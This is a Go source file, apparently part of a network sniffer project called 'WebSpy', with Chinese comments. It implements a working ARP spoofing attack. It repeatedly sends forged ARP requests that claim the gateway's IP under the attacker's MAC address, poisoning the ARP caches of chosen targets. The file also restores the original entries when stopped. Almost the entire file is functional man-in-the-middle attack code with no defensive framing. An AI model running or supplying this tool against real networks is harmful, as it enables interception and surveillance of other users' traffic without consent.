package arpspoof

import (
	"bytes"
	"net"
	"os"
	"os/signal"
	"securitydevelopment/Sniffer/WebSpy/logger"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/malfunkt/arpfox/arp"
	"github.com/malfunkt/iprange"
)

// ArpSpoof 执行 ARP 欺骗的主函数
func ArpSpoof(deviceName string, handler *pcap.Handle, flagTarget, gateway string) {
	// 获取指定网络接口
	iface, err := net.InterfaceByName(deviceName)
	if err != nil {
		logger.Log.Fatalf("无法使用接口 %s: %v", deviceName, err)
	}

	// 获取接口的 IP 地址
	var ifaceAddr *net.IPNet
	ifaceAddrs, err := iface.Addrs()
	if err != nil {
		logger.Log.Fatal(err)
	}
	for _, addr := range ifaceAddrs {
		if ipnet, ok := addr.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				ifaceAddr = &net.IPNet{
					IP:   ip4,
					Mask: net.IPMask([]byte{0xff, 0xff, 0xff, 0xff}),
				}
				break
			}
		}
	}
	if ifaceAddr == nil {
		logger.Log.Fatal("无法获取接口地址。")
	}

	// 处理目标地址
	var targetAddrs []net.IP
	if flagTarget != "" {
		addrRange, err := iprange.ParseList(flagTarget)
		if err != nil {
			logger.Log.Fatal("目标格式错误。")
		}
		targetAddrs = addrRange.Expand()
		if len(targetAddrs) == 0 {
			logger.Log.Fatal("未提供有效的目标。")
		}
	}

	// 解析网关 IP
	gatewayIP := net.ParseIP(gateway).To4()
	stop := make(chan struct{}, 2)

	// 监听中断信号（Ctrl+C）
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt)
	go func() {
		<-c
		logger.Log.Println("'stop' 信号接收到；正在停止...")
		close(stop)
	}()

	// 启动读取 ARP 的 goroutine
	go readARP(handler, stop, iface)

	// 查找网关的原始硬件地址
	origSrc, err := arp.Lookup(gatewayIP)
	if err != nil {
		logger.Log.Fatalf("无法查找 %s 的硬件地址: %v", gatewayIP, err)
	}

	// 创建伪造的源地址
	fakeSrc := arp.Address{
		IP:           gatewayIP,
		HardwareAddr: iface.HardwareAddr,
	}

	// 写入伪造的 ARP 数据包
	<-writeARP(handler, stop, targetAddrs, &fakeSrc, 100*time.Millisecond)

	// 清理以及恢复目标的 ARP 表项
	<-cleanUpAndReARP(handler, targetAddrs, origSrc)

	os.Exit(0)
}

// cleanUpAndReARP 清理并重新执行 ARP
func cleanUpAndReARP(handler *pcap.Handle, targetAddrs []net.IP, src *arp.Address) chan struct{} {
	logger.Log.Infof("清理并重新ARP目标...")

	stopReARPing := make(chan struct{})
	go func() {
		t := time.NewTicker(5 * time.Second)
		<-t.C
		close(stopReARPing)
	}()

	return writeARP(handler, stopReARPing, targetAddrs, src, 500*time.Millisecond)
}

// 发送ARP包
func writeARP(handler *pcap.Handle, stop chan struct{}, targetAddrs []net.IP, src *arp.Address, waitInterval time.Duration) chan struct{} {
	stoppedWriting := make(chan struct{})
	go func() {
		t := time.NewTicker(waitInterval)
		defer t.Stop()

		for {
			select {
			case <-stop:
				stoppedWriting <- struct{}{}
				return
			case <-t.C:
				for _, ip := range targetAddrs {
					sendARPRequest(handler, src, ip) // 发送ARP请求
				}
			}
		}
	}()
	return stoppedWriting
}

// 发送单个ARP请求
func sendARPRequest(handler *pcap.Handle, src *arp.Address, ip net.IP) {
	arpAddr, err := arp.Lookup(ip)
	if err != nil {
		logger.Log.Errorf("无法检索 %v 的 MAC 地址: %v", ip, err)
		return
	}

	dst := &arp.Address{
		IP:           ip,
		HardwareAddr: arpAddr.HardwareAddr,
	}
	buf, err := arp.NewARPRequest(src, dst)
	if err != nil {
		logger.Log.Error("创建新ARP请求失败: ", err)
		return
	}
	if err := handler.WritePacketData(buf); err != nil {
		logger.Log.Error("写入数据包失败: ", err)
	}
}

// 读取ARP数据包
func readARP(handle *pcap.Handle, stop chan struct{}, iface *net.Interface) {
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	in := src.Packets()
	for {
		select {
		case <-stop:
			return
		case packet := <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			processARPPacket(arpLayer, iface) // 处理ARP数据包
		}
	}
}

// 处理ARP数据包
func processARPPacket(arpLayer gopacket.Layer, iface *net.Interface) {
	packet := arpLayer.(*layers.ARP)
	if !bytes.Equal([]byte(iface.HardwareAddr), packet.SourceHwAddress) {
		return
	}
	if packet.Operation == layers.ARPReply {
		arp.Add(net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress))
	}
	logger.Log.Debugf("ARP 数据包 (%d): %v (%v) -> %v (%v)", packet.Operation,
		net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress),
		net.IP(packet.DstProtAddress), net.HardwareAddr(packet.DstHwAddress))
}